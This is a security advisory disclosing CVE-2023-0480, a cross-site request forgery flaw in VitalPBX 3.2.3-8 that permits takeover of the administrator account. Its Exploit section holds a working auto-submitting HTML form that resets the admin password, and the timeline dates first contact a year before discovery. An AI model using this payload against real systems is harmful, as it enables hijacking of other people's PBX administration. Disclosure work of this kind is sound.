---
slug: advisories/sharp/
title: VitalPBX 3.2.3-8 - Account Takeover via CSRF
authors: Carlos Bello
writer: cbello
codename: sharp
product: VitalPBX 3.2.3-8
date: 2023-02-06 12:00 COT
cveid: CVE-2023-0480
severity: 6.5
description: VitalPBX 3.2.3-8     -    Account Takeover via CSRF
keywords: Fluid Attacks, Security, Vulnerabilities, Vital PBX, Account Takeover
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                      |
| --------------------- | -------------------------------------------------------------------- |
| **Name**              | VitalPBX 3.2.3-8     -    Account Takeover via CSRF                  |
| **Code name**         | [Sharp](https://en.wikipedia.org/wiki/Ten_Sharp)                     |
| **Product**           | VitalPBX                                                             |
| **Affected versions** | 3.2.3-8                                                              |
| **State**             | Public                                                               |
| **Release Date**      | 2023-02-06                                                           |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Cross-site request forgery                                                                             |
| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)          |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N                                                               |
| **CVSSv3 Base Score** | 6.5                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-0480](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0480)                          |

## Description

VitalPBX version 3.2.3-8 allows an unauthenticated external attacker to
obtain the instance administrator's account. This is possible because the
application is vulnerable to CSRF.

## Vulnerability

This vulnerability occurs because the application is vulnerable to CSRF.

### Exploit

To exploit this vulnerability, we only need to send the administrator a
malicious HTML like the following.

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://137.184.73.151/index.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="user_id" value="1" />
      <input type="hidden" name="class" value="user_profile" />
      <input type="hidden" name="method" value="put" />
      <input type="hidden" name="mode" value="edit" />
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="email" value="" />
      <input type="hidden" name="password" value="hacked" />
      <input type="hidden" name="role" value="1" />
      <input type="hidden" name="startapp" value="dashboard" />
      <input type="hidden" name="startapp_custom" value="" />
      <input type="hidden" name="displayname" value="Administrator" />
      <input type="hidden" name="department" value="Administración" />
      <input type="hidden" name="userphoto" value="" />
      <input type="hidden" name="userphoto" value="" />
      <input type="hidden" name="userphoto_configured" value="" />
      <input type="hidden" name="theme" value="vital_pbx" />
      <input type="hidden" name="locale" value="en_US" />
      <input type="hidden" name="timezone" value="system" />
      <input type="hidden" name="multitab" value="1" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Evidence of exploitation

![CSRF-Leads-ATO](https://user-images.githubusercontent.com/51862990/214678035-df11fa40-5836-4458-a40b-55427a46ba3d.gif)

## Our security policy

We have reserved the ID CVE-2023-0480 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: VitalPBX 3.2.3-8

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://vitalpbx.com/>

## Timeline

<time-lapse
  discovered="2023-01-24"
  contacted="2022-01-24"
  replied=""
  confirmed=""
  patched=""
  disclosure="2023-02-06">
</time-lapse>
